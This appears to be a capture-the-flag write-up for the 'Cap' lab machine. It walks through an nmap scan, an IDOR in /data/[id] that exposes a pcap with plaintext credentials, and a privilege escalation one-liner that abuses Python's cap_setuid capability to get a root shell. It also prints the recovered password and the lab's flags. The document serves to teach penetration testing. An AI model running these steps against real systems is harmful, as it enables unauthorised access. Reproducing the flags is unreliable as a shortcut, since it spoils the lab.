# Cap

---

IP = `10.10.10.245`

## Recon

### nmap

`nmap -sV 10.10.10.245 -oN nmap/initial`

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```
http://10.10.10.245/

### Directory traversal

```
/data
/ip
/netstat
```

http://10.10.10.245/data/0

http://10.10.10.245/data/[id] is vulnerable is IDOR


## Initial foothold 

http://10.10.10.245/data/0

Download and analyze the (0.pcap) file
we got credentials!

why? - unencrypted credential passing

`nathan:Buck3tH4TF0RM3!`

**user.txt**
`afa1d32568ef836b10397127a86dbfef`

## Privilege Escalation

```
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
--SNIP--
```
[Linux Capabilities - privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example)

`nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'`

**root.txt**
`947781d6c4b98b3d89ad4b997b017748`